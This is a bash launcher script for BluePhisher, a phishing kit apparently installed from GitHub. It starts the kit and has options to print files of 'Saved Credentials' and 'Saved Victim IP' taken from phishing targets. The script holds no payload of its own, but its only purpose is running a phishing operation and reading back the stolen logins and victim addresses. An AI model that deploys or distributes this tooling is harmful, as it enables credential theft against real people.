#!/bin/bash

# https://github.com/htr-tech/bluephisher

if [[ $(uname -o) == *'Android'* ]];then
	BLUEPHISHER_ROOT="/data/data/com.termux/files/usr/opt/bluephisher"
else
	export BLUEPHISHER_ROOT="/opt/bluephisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run BluePhisher type \`bluephisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $BLUEPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $BLUEPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $BLUEPHISHER_ROOT
	bash ./bluephisher.sh
fi
